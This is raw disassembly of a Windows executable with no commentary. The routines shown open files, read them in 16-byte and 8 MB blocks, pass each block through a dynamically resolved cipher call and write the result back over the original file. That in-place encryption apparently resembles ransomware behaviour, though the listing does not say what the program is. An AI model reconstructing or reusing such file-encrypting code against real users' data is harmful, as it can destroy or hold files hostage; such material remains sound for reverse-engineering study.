   140003201:	85 c0                	test   %eax,%eax
   140003203:	75 10                	jne    0x140003215
   140003205:	48 8b ce             	mov    %rsi,%rcx
   140003208:	ff 15 5a ce 02 00    	call   *0x2ce5a(%rip)        # 0x140030068
   14000320e:	32 c0                	xor    %al,%al
   140003210:	e9 10 03 00 00       	jmp    0x140003525
   140003215:	b9 01 00 80 00       	mov    $0x800001,%ecx
   14000321a:	e8 4d bc 00 00       	call   0x14000ee6c
   14000321f:	4c 8b f0             	mov    %rax,%r14
   140003222:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140003227:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   14000322b:	c6 04 08 00          	movb   $0x0,(%rax,%rcx,1)
   14000322f:	44 89 64 24 60       	mov    %r12d,0x60(%rsp)
   140003234:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140003239:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   14000323e:	44 8b 47 50          	mov    0x50(%rdi),%r8d
   140003242:	48 8b d0             	mov    %rax,%rdx
   140003245:	48 8b ce             	mov    %rsi,%rcx
   140003248:	ff 15 b2 cd 02 00    	call   *0x2cdb2(%rip)        # 0x140030000
   14000324e:	85 c0                	test   %eax,%eax
   140003250:	0f 84 b9 02 00 00    	je     0x14000350f
   140003256:	4c 8b 4f 50          	mov    0x50(%rdi),%r9
   14000325a:	8b 44 24 60          	mov    0x60(%rsp),%eax
   14000325e:	49 3b c1             	cmp    %r9,%rax
   140003261:	0f 85 a8 02 00 00    	jne    0x14000350f
   140003267:	48 8d 5f 40          	lea    0x40(%rdi),%rbx
   14000326b:	4c 8b c3             	mov    %rbx,%r8
   14000326e:	48 83 7b 18 0f       	cmpq   $0xf,0x18(%rbx)
   140003273:	76 03                	jbe    0x140003278
   140003275:	4c 8b 03             	mov    (%rbx),%r8
   140003278:	49 8b c6             	mov    %r14,%rax
   14000327b:	4d 2b c6             	sub    %r14,%r8
   14000327e:	66 90                	xchg   %ax,%ax
   140003280:	0f b6 10             	movzbl (%rax),%edx
   140003283:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140003288:	2b d1                	sub    %ecx,%edx
   14000328a:	75 07                	jne    0x140003293
   14000328c:	48 ff c0             	inc    %rax
   14000328f:	85 c9                	test   %ecx,%ecx
   140003291:	75 ed                	jne    0x140003280
   140003293:	85 d2                	test   %edx,%edx
   140003295:	0f 85 74 02 00 00    	jne    0x14000350f
   14000329b:	8b 6c 24 68          	mov    0x68(%rsp),%ebp
   14000329f:	41 2b e9             	sub    %r9d,%ebp
   1400032a2:	2b 6f 70             	sub    0x70(%rdi),%ebp
   1400032a5:	44 8b ed             	mov    %ebp,%r13d
   1400032a8:	41 c1 ed 17          	shr    $0x17,%r13d
   1400032ac:	41 ff c5             	inc    %r13d
   1400032af:	81 e5 ff ff 7f 00    	and    $0x7fffff,%ebp
   1400032b5:	b9 00 00 80 00       	mov    $0x800000,%ecx
   1400032ba:	e8 ad bb 00 00       	call   0x14000ee6c
   1400032bf:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400032c4:	48 83 7b 18 0f       	cmpq   $0xf,0x18(%rbx)
   1400032c9:	76 0c                	jbe    0x1400032d7
   1400032cb:	4c 8b 03             	mov    (%rbx),%r8
   1400032ce:	4c 03 43 10          	add    0x10(%rbx),%r8
   1400032d2:	48 8b 1b             	mov    (%rbx),%rbx
   1400032d5:	eb 07                	jmp    0x1400032de
   1400032d7:	4c 8b 43 10          	mov    0x10(%rbx),%r8
   1400032db:	4c 03 c3             	add    %rbx,%r8
   1400032de:	4c 2b c3             	sub    %rbx,%r8
   1400032e1:	48 8b d3             	mov    %rbx,%rdx
   1400032e4:	48 8b c8             	mov    %rax,%rcx
   1400032e7:	e8 e4 ac 02 00       	call   0x14002dfd0
   1400032ec:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400032f1:	8b 53 70             	mov    0x70(%rbx),%edx
   1400032f4:	f7 da                	neg    %edx
   1400032f6:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400032fc:	45 33 c0             	xor    %r8d,%r8d
   1400032ff:	48 8b ce             	mov    %rsi,%rcx
   140003302:	ff 15 28 cd 02 00    	call   *0x2cd28(%rip)        # 0x140030030
   140003308:	48 8b ce             	mov    %rsi,%rcx
   14000330b:	ff 15 27 cd 02 00    	call   *0x2cd27(%rip)        # 0x140030038
   140003311:	45 33 c9             	xor    %r9d,%r9d
   140003314:	45 33 c0             	xor    %r8d,%r8d
   140003317:	8b 53 50             	mov    0x50(%rbx),%edx
   14000331a:	48 8b ce             	mov    %rsi,%rcx
   14000331d:	ff 15 0d cd 02 00    	call   *0x2cd0d(%rip)        # 0x140030030
   140003323:	44 89 64 24 58       	mov    %r12d,0x58(%rsp)
   140003328:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000332d:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140003332:	41 b8 00 00 80 00    	mov    $0x800000,%r8d
   140003338:	49 8b d6             	mov    %r14,%rdx
   14000333b:	48 8b ce             	mov    %rsi,%rcx
   14000333e:	ff 15 bc cc 02 00    	call   *0x2ccbc(%rip)        # 0x140030000
   140003344:	85 c0                	test   %eax,%eax
   140003346:	0f 84 ac 01 00 00    	je     0x1400034f8
   14000334c:	41 8b fc             	mov    %r12d,%edi
   14000334f:	44 8b 7c 24 58       	mov    0x58(%rsp),%r15d
   140003354:	41 3b fd             	cmp    %r13d,%edi
   140003357:	72 08                	jb     0x140003361
   140003359:	85 ed                	test   %ebp,%ebp
   14000335b:	0f 84 8a 01 00 00    	je     0x1400034eb
   140003361:	48 83 c3 30          	add    $0x30,%rbx
   140003365:	48 8d 15 7c 81 03 00 	lea    0x3817c(%rip),%rdx        # 0x14003b4e8
   14000336c:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003371:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140003375:	ff 15 fd cc 02 00    	call   *0x2ccfd(%rip)        # 0x140030078
   14000337b:	33 c9                	xor    %ecx,%ecx
   14000337d:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   140003381:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   140003385:	48 8d 4c 24 64       	lea    0x64(%rsp),%rcx
   14000338a:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000338f:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
   140003394:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140003399:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   1400033a0:	00 
   1400033a1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400033a6:	45 33 c9             	xor    %r9d,%r9d
   1400033a9:	45 8b c7             	mov    %r15d,%r8d
   1400033ac:	49 8b d6             	mov    %r14,%rdx
   1400033af:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400033b4:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1400033b8:	ff d0                	call   *%rax
   1400033ba:	85 c0                	test   %eax,%eax
   1400033bc:	0f 85 36 01 00 00    	jne    0x1400034f8
   1400033c2:	45 33 c9             	xor    %r9d,%r9d
   1400033c5:	45 33 c0             	xor    %r8d,%r8d
   1400033c8:	41 8b d4             	mov    %r12d,%edx
   1400033cb:	48 8b ce             	mov    %rsi,%rcx
   1400033ce:	ff 15 5c cc 02 00    	call   *0x2cc5c(%rip)        # 0x140030030
   1400033d4:	33 d2                	xor    %edx,%edx
   1400033d6:	89 54 24 5c          	mov    %edx,0x5c(%rsp)
   1400033da:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   1400033de:	3b f8                	cmp    %eax,%edi
   1400033e0:	72 04                	jb     0x1400033e6
   1400033e2:	85 ed                	test   %ebp,%ebp
   1400033e4:	74 7f                	je     0x140003465
   1400033e6:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   1400033ea:	3b f8                	cmp    %eax,%edi
   1400033ec:	72 08                	jb     0x1400033f6
   1400033ee:	85 ed                	test   %ebp,%ebp
   1400033f0:	0f 85 a6 00 00 00    	jne    0x14000349c
   1400033f6:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400033fb:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
   140003400:	45 8b c7             	mov    %r15d,%r8d
   140003403:	49 8b d6             	mov    %r14,%rdx
   140003406:	48 8b ce             	mov    %rsi,%rcx
   140003409:	ff 15 11 cc 02 00    	call   *0x2cc11(%rip)        # 0x140030020
   14000340f:	85 c0                	test   %eax,%eax
   140003411:	0f 84 e1 00 00 00    	je     0x1400034f8
   140003417:	8b 53 50             	mov    0x50(%rbx),%edx
   14000341a:	81 c2 00 00 80 00    	add    $0x800000,%edx
   140003420:	41 03 d4             	add    %r12d,%edx
   140003423:	45 33 c9             	xor    %r9d,%r9d
   140003426:	45 33 c0             	xor    %r8d,%r8d
   140003429:	48 8b ce             	mov    %rsi,%rcx
   14000342c:	ff 15 fe cb 02 00    	call   *0x2cbfe(%rip)        # 0x140030030
   140003432:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003439:	00 00 
   14000343b:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140003440:	45 8b c7             	mov    %r15d,%r8d
   140003443:	49 8b d6             	mov    %r14,%rdx
   140003446:	48 8b ce             	mov    %rsi,%rcx
   140003449:	ff 15 b1 cb 02 00    	call   *0x2cbb1(%rip)        # 0x140030000
   14000344f:	85 c0                	test   %eax,%eax
   140003451:	0f 84 a1 00 00 00    	je     0x1400034f8
   140003457:	ff c7                	inc    %edi
   140003459:	41 81 c4 00 00 80 00 	add    $0x800000,%r12d
   140003460:	e9 ea fe ff ff       	jmp    0x14000334f
   140003465:	43 0f b6 44 37 ff    	movzbl -0x1(%r15,%r14,1),%eax
   14000346b:	45 8b c7             	mov    %r15d,%r8d
   14000346e:	44 2b c0             	sub    %eax,%r8d
   140003471:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003476:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
   14000347b:	49 8b d6             	mov    %r14,%rdx
   14000347e:	48 8b ce             	mov    %rsi,%rcx
   140003481:	ff 15 99 cb 02 00    	call   *0x2cb99(%rip)        # 0x140030020
   140003487:	85 c0                	test   %eax,%eax
   140003489:	74 76                	je     0x140003501
   14000348b:	c1 e7 17             	shl    $0x17,%edi
   14000348e:	43 0f b6 44 37 ff    	movzbl -0x1(%r15,%r14,1),%eax
   140003494:	2b f8                	sub    %eax,%edi
   140003496:	41 8d 14 3f          	lea    (%r15,%rdi,1),%edx
   14000349a:	eb 37                	jmp    0x1400034d3
   14000349c:	8d 45 ff             	lea    -0x1(%rbp),%eax
   14000349f:	8b d8                	mov    %eax,%ebx
   1400034a1:	42 0f b6 04 30       	movzbl (%rax,%r14,1),%eax
   1400034a6:	44 8b c5             	mov    %ebp,%r8d
   1400034a9:	44 2b c0             	sub    %eax,%r8d
   1400034ac:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400034b1:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
   1400034b6:	49 8b d6             	mov    %r14,%rdx
   1400034b9:	48 8b ce             	mov    %rsi,%rcx
   1400034bc:	ff 15 5e cb 02 00    	call   *0x2cb5e(%rip)        # 0x140030020
   1400034c2:	85 c0                	test   %eax,%eax
   1400034c4:	74 3b                	je     0x140003501
   1400034c6:	c1 e7 17             	shl    $0x17,%edi
   1400034c9:	42 0f b6 04 33       	movzbl (%rbx,%r14,1),%eax
   1400034ce:	2b f8                	sub    %eax,%edi
   1400034d0:	8d 14 2f             	lea    (%rdi,%rbp,1),%edx
   1400034d3:	45 33 c9             	xor    %r9d,%r9d
   1400034d6:	45 33 c0             	xor    %r8d,%r8d
   1400034d9:	48 8b ce             	mov    %rsi,%rcx
   1400034dc:	ff 15 4e cb 02 00    	call   *0x2cb4e(%rip)        # 0x140030030
   1400034e2:	48 8b ce             	mov    %rsi,%rcx
   1400034e5:	ff 15 4d cb 02 00    	call   *0x2cb4d(%rip)        # 0x140030038
   1400034eb:	48 8b ce             	mov    %rsi,%rcx
   1400034ee:	ff 15 74 cb 02 00    	call   *0x2cb74(%rip)        # 0x140030068
   1400034f4:	b3 01                	mov    $0x1,%bl
   1400034f6:	eb 0b                	jmp    0x140003503
   1400034f8:	48 8b ce             	mov    %rsi,%rcx
   1400034fb:	ff 15 67 cb 02 00    	call   *0x2cb67(%rip)        # 0x140030068
   140003501:	32 db                	xor    %bl,%bl
   140003503:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140003508:	e8 13 b9 00 00       	call   0x14000ee20
   14000350d:	eb 0b                	jmp    0x14000351a
   14000350f:	48 8b ce             	mov    %rsi,%rcx
   140003512:	ff 15 50 cb 02 00    	call   *0x2cb50(%rip)        # 0x140030068
   140003518:	32 db                	xor    %bl,%bl
   14000351a:	49 8b ce             	mov    %r14,%rcx
   14000351d:	e8 fe b8 00 00       	call   0x14000ee20
   140003522:	0f b6 c3             	movzbl %bl,%eax
   140003525:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   14000352c:	00 
   14000352d:	48 33 cc             	xor    %rsp,%rcx
   140003530:	e8 cb b8 00 00       	call   0x14000ee00
   140003535:	48 8b 9c 24 e0 00 00 	mov    0xe0(%rsp),%rbx
   14000353c:	00 
   14000353d:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140003544:	41 5f                	pop    %r15
   140003546:	41 5e                	pop    %r14
   140003548:	41 5d                	pop    %r13
   14000354a:	41 5c                	pop    %r12
   14000354c:	5f                   	pop    %rdi
   14000354d:	5e                   	pop    %rsi
   14000354e:	5d                   	pop    %rbp
   14000354f:	c3                   	ret
   140003550:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003555:	55                   	push   %rbp
   140003556:	56                   	push   %rsi
   140003557:	57                   	push   %rdi
   140003558:	41 54                	push   %r12
   14000355a:	41 55                	push   %r13
   14000355c:	41 56                	push   %r14
   14000355e:	41 57                	push   %r15
   140003560:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140003567:	48 8b 05 d2 fa 03 00 	mov    0x3fad2(%rip),%rax        # 0x140043040
   14000356e:	48 33 c4             	xor    %rsp,%rax
   140003571:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140003578:	00 
   140003579:	48 8b c2             	mov    %rdx,%rax
   14000357c:	4c 8b e1             	mov    %rcx,%r12
   14000357f:	48 83 7a 18 07       	cmpq   $0x7,0x18(%rdx)
   140003584:	76 03                	jbe    0x140003589
   140003586:	48 8b 02             	mov    (%rdx),%rax
   140003589:	33 ff                	xor    %edi,%edi
   14000358b:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140003590:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140003597:	00 
   140003598:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   14000359f:	00 
   1400035a0:	45 33 c9             	xor    %r9d,%r9d
   1400035a3:	45 33 c0             	xor    %r8d,%r8d
   1400035a6:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   1400035ab:	48 8b c8             	mov    %rax,%rcx
   1400035ae:	ff 15 94 ca 02 00    	call   *0x2ca94(%rip)        # 0x140030048
   1400035b4:	48 8b f0             	mov    %rax,%rsi
   1400035b7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400035bb:	74 1b                	je     0x1400035d8
   1400035bd:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400035c2:	48 8b c8             	mov    %rax,%rcx
   1400035c5:	ff 15 45 ca 02 00    	call   *0x2ca45(%rip)        # 0x140030010
   1400035cb:	85 c0                	test   %eax,%eax
   1400035cd:	75 10                	jne    0x1400035df
   1400035cf:	48 8b ce             	mov    %rsi,%rcx
   1400035d2:	ff 15 90 ca 02 00    	call   *0x2ca90(%rip)        # 0x140030068
   1400035d8:	32 c0                	xor    %al,%al
   1400035da:	e9 67 02 00 00       	jmp    0x140003846
   1400035df:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400035e4:	44 8b eb             	mov    %ebx,%r13d
   1400035e7:	41 c1 ed 04          	shr    $0x4,%r13d
   1400035eb:	83 e3 0f             	and    $0xf,%ebx
   1400035ee:	b9 10 00 00 00       	mov    $0x10,%ecx
   1400035f3:	e8 74 b8 00 00       	call   0x14000ee6c
   1400035f8:	4c 8b f8             	mov    %rax,%r15
   1400035fb:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140003600:	66 0f 6f 05 c8 92 03 	movdqa 0x392c8(%rip),%xmm0        # 0x14003c8d0
   140003607:	00 
   140003608:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000360d:	45 33 c9             	xor    %r9d,%r9d
   140003610:	45 33 c0             	xor    %r8d,%r8d
   140003613:	33 d2                	xor    %edx,%edx
   140003615:	48 8b ce             	mov    %rsi,%rcx
   140003618:	ff 15 12 ca 02 00    	call   *0x2ca12(%rip)        # 0x140030030
   14000361e:	8b ef                	mov    %edi,%ebp
   140003620:	45 85 ed             	test   %r13d,%r13d
   140003623:	0f 84 1d 01 00 00    	je     0x140003746
   140003629:	44 8b f7             	mov    %edi,%r14d
   14000362c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003630:	45 33 c9             	xor    %r9d,%r9d
   140003633:	45 33 c0             	xor    %r8d,%r8d
   140003636:	41 8b d6             	mov    %r14d,%edx
   140003639:	48 8b ce             	mov    %rsi,%rcx
   14000363c:	ff 15 ee c9 02 00    	call   *0x2c9ee(%rip)        # 0x140030030
   140003642:	89 7c 24 58          	mov    %edi,0x58(%rsp)
   140003646:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000364b:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140003650:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003656:	49 8b d7             	mov    %r15,%rdx
   140003659:	48 8b ce             	mov    %rsi,%rcx
   14000365c:	ff 15 9e c9 02 00    	call   *0x2c99e(%rip)        # 0x140030000
   140003662:	85 c0                	test   %eax,%eax
   140003664:	0f 84 cb 01 00 00    	je     0x140003835
   14000366a:	49 8d 7c 24 30       	lea    0x30(%r12),%rdi
   14000366f:	48 8d 15 62 7e 03 00 	lea    0x37e62(%rip),%rdx        # 0x14003b4d8
   140003676:	49 8b 4c 24 28       	mov    0x28(%r12),%rcx
   14000367b:	ff 15 f7 c9 02 00    	call   *0x2c9f7(%rip)        # 0x140030078
   140003681:	33 c9                	xor    %ecx,%ecx
   140003683:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   140003687:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   14000368b:	48 8d 4c 24 54       	lea    0x54(%rsp),%rcx
   140003690:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140003695:	c7 44 24 38 10 00 00 	movl   $0x10,0x38(%rsp)
   14000369c:	00 
   14000369d:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400036a2:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   1400036a9:	00 
   1400036aa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400036af:	45 33 c9             	xor    %r9d,%r9d
   1400036b2:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400036b8:	49 8b d7             	mov    %r15,%rdx
   1400036bb:	49 8b 4c 24 10       	mov    0x10(%r12),%rcx
   1400036c0:	ff d0                	call   *%rax
   1400036c2:	85 c0                	test   %eax,%eax
   1400036c4:	0f 85 6b 01 00 00    	jne    0x140003835
   1400036ca:	45 33 c9             	xor    %r9d,%r9d
   1400036cd:	45 33 c0             	xor    %r8d,%r8d
   1400036d0:	41 8b d6             	mov    %r14d,%edx
   1400036d3:	48 8b ce             	mov    %rsi,%rcx
   1400036d6:	ff 15 54 c9 02 00    	call   *0x2c954(%rip)        # 0x140030030
   1400036dc:	33 ff                	xor    %edi,%edi
   1400036de:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   1400036e2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400036e7:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1400036ec:	44 8b 44 24 54       	mov    0x54(%rsp),%r8d
   1400036f1:	49 8b d7             	mov    %r15,%rdx
   1400036f4:	48 8b ce             	mov    %rsi,%rcx
   1400036f7:	ff 15 23 c9 02 00    	call   *0x2c923(%rip)        # 0x140030020
   1400036fd:	85 c0                	test   %eax,%eax
   1400036ff:	0f 84 30 01 00 00    	je     0x140003835
   140003705:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   140003709:	3b e8                	cmp    %eax,%ebp
   14000370b:	75 2a                	jne    0x140003737
   14000370d:	85 db                	test   %ebx,%ebx
   14000370f:	75 26                	jne    0x140003737
   140003711:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003716:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000371b:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003721:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003726:	48 8b ce             	mov    %rsi,%rcx
   140003729:	ff 15 f1 c8 02 00    	call   *0x2c8f1(%rip)        # 0x140030020
   14000372f:	85 c0                	test   %eax,%eax
   140003731:	0f 84 fe 00 00 00    	je     0x140003835
   140003737:	ff c5                	inc    %ebp
   140003739:	41 83 c6 10          	add    $0x10,%r14d
   14000373d:	41 3b ed             	cmp    %r13d,%ebp
   140003740:	0f 82 ea fe ff ff    	jb     0x140003630
   140003746:	85 db                	test   %ebx,%ebx
   140003748:	0f 84 eb 00 00 00    	je     0x140003839
   14000374e:	41 c1 e5 04          	shl    $0x4,%r13d
   140003752:	45 33 c9             	xor    %r9d,%r9d
   140003755:	45 33 c0             	xor    %r8d,%r8d
   140003758:	41 8b d5             	mov    %r13d,%edx
   14000375b:	48 8b ce             	mov    %rsi,%rcx
   14000375e:	ff 15 cc c8 02 00    	call   *0x2c8cc(%rip)        # 0x140030030
   140003764:	89 7c 24 58          	mov    %edi,0x58(%rsp)
   140003768:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000376d:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140003772:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003778:	49 8b d7             	mov    %r15,%rdx
   14000377b:	48 8b ce             	mov    %rsi,%rcx
   14000377e:	ff 15 7c c8 02 00    	call   *0x2c87c(%rip)        # 0x140030000
   140003784:	85 c0                	test   %eax,%eax
   140003786:	0f 84 a9 00 00 00    	je     0x140003835
   14000378c:	8b cb                	mov    %ebx,%ecx
   14000378e:	49 03 cf             	add    %r15,%rcx
   140003791:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003797:	44 2b c3             	sub    %ebx,%r8d
   14000379a:	ba 10 00 00 00       	mov    $0x10,%edx
   14000379f:	2a d3                	sub    %bl,%dl
   1400037a1:	e8 ca ae 02 00       	call   0x14002e670
   1400037a6:	49 8d 5c 24 30       	lea    0x30(%r12),%rbx
   1400037ab:	48 8d 15 26 7d 03 00 	lea    0x37d26(%rip),%rdx        # 0x14003b4d8
   1400037b2:	49 8b 4c 24 28       	mov    0x28(%r12),%rcx
   1400037b7:	ff 15 bb c8 02 00    	call   *0x2c8bb(%rip)        # 0x140030078
   1400037bd:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   1400037c1:	89 7c 24 48          	mov    %edi,0x48(%rsp)
   1400037c5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400037ca:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400037cf:	c7 44 24 38 10 00 00 	movl   $0x10,0x38(%rsp)
   1400037d6:	00 
   1400037d7:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400037dc:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   1400037e3:	00 
   1400037e4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400037e9:	45 33 c9             	xor    %r9d,%r9d
   1400037ec:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400037f2:	49 8b d7             	mov    %r15,%rdx
   1400037f5:	49 8b 4c 24 10       	mov    0x10(%r12),%rcx
   1400037fa:	ff d0                	call   *%rax
   1400037fc:	85 c0                	test   %eax,%eax
   1400037fe:	75 35                	jne    0x140003835
   140003800:	45 33 c9             	xor    %r9d,%r9d
   140003803:	45 33 c0             	xor    %r8d,%r8d
   140003806:	41 8b d5             	mov    %r13d,%edx
   140003809:	48 8b ce             	mov    %rsi,%rcx
   14000380c:	ff 15 1e c8 02 00    	call   *0x2c81e(%rip)        # 0x140030030
   140003812:	89 7c 24 54          	mov    %edi,0x54(%rsp)
   140003816:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000381b:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   140003820:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   140003825:	49 8b d7             	mov    %r15,%rdx
   140003828:	48 8b ce             	mov    %rsi,%rcx
   14000382b:	ff 15 ef c7 02 00    	call   *0x2c7ef(%rip)        # 0x140030020
   140003831:	85 c0                	test   %eax,%eax
   140003833:	75 04                	jne    0x140003839
   140003835:	32 db                	xor    %bl,%bl
   140003837:	eb 02                	jmp    0x14000383b
   140003839:	b3 01                	mov    $0x1,%bl
   14000383b:	49 8b cf             	mov    %r15,%rcx
   14000383e:	e8 dd b5 00 00       	call   0x14000ee20
   140003843:	0f b6 c3             	movzbl %bl,%eax
   140003846:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   14000384d:	00 
   14000384e:	48 33 cc             	xor    %rsp,%rcx
   140003851:	e8 aa b5 00 00       	call   0x14000ee00
   140003856:	48 8b 9c 24 e0 00 00 	mov    0xe0(%rsp),%rbx
   14000385d:	00 
   14000385e:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140003865:	41 5f                	pop    %r15
   140003867:	41 5e                	pop    %r14
   140003869:	41 5d                	pop    %r13
   14000386b:	41 5c                	pop    %r12
   14000386d:	5f                   	pop    %rdi
   14000386e:	5e                   	pop    %rsi
   14000386f:	5d                   	pop    %rbp
   140003870:	c3                   	ret
   140003871:	cc                   	int3
   140003872:	cc                   	int3
   140003873:	cc                   	int3
   140003874:	cc                   	int3
   140003875:	cc                   	int3
   140003876:	cc                   	int3
   140003877:	cc                   	int3
   140003878:	cc                   	int3
   140003879:	cc                   	int3
   14000387a:	cc                   	int3
   14000387b:	cc                   	int3
   14000387c:	cc                   	int3
   14000387d:	cc                   	int3
   14000387e:	cc                   	int3
   14000387f:	cc                   	int3
   140003880:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003885:	55                   	push   %rbp
   140003886:	56                   	push   %rsi
   140003887:	57                   	push   %rdi
   140003888:	41 54                	push   %r12
   14000388a:	41 55                	push   %r13
   14000388c:	41 56                	push   %r14
   14000388e:	41 57                	push   %r15
   140003890:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003897:	48 8b 05 a2 f7 03 00 	mov    0x3f7a2(%rip),%rax        # 0x140043040
   14000389e:	48 33 c4             	xor    %rsp,%rax
   1400038a1:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400038a6:	48 8b c2             	mov    %rdx,%rax
   1400038a9:	4c 8b e1             	mov    %rcx,%r12
   1400038ac:	48 83 7a 18 07       	cmpq   $0x7,0x18(%rdx)
   1400038b1:	76 03                	jbe    0x1400038b6
   1400038b3:	48 8b 02             	mov    (%rdx),%rax
   1400038b6:	33 ff                	xor    %edi,%edi
   1400038b8:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400038bd:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400038c4:	00 
   1400038c5:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   1400038cc:	00 
   1400038cd:	45 33 c9             	xor    %r9d,%r9d
   1400038d0:	45 33 c0             	xor    %r8d,%r8d
   1400038d3:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   1400038d8:	48 8b c8             	mov    %rax,%rcx
   1400038db:	ff 15 67 c7 02 00    	call   *0x2c767(%rip)        # 0x140030048
   1400038e1:	48 8b f0             	mov    %rax,%rsi
   1400038e4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400038e8:	74 1b                	je     0x140003905
   1400038ea:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400038ef:	48 8b c8             	mov    %rax,%rcx
   1400038f2:	ff 15 18 c7 02 00    	call   *0x2c718(%rip)        # 0x140030010
   1400038f8:	85 c0                	test   %eax,%eax
   1400038fa:	75 10                	jne    0x14000390c
   1400038fc:	48 8b ce             	mov    %rsi,%rcx
   1400038ff:	ff 15 63 c7 02 00    	call   *0x2c763(%rip)        # 0x140030068
   140003905:	32 c0                	xor    %al,%al
   140003907:	e9 6e 02 00 00       	jmp    0x140003b7a
   14000390c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140003911:	44 8b eb             	mov    %ebx,%r13d
   140003914:	41 c1 ed 04          	shr    $0x4,%r13d
   140003918:	83 e3 0f             	and    $0xf,%ebx
   14000391b:	b9 10 00 00 00       	mov    $0x10,%ecx
   140003920:	e8 47 b5 00 00       	call   0x14000ee6c
   140003925:	48 8b e8             	mov    %rax,%rbp
   140003928:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   14000392d:	45 33 c9             	xor    %r9d,%r9d
   140003930:	45 33 c0             	xor    %r8d,%r8d
   140003933:	33 d2                	xor    %edx,%edx
   140003935:	48 8b ce             	mov    %rsi,%rcx
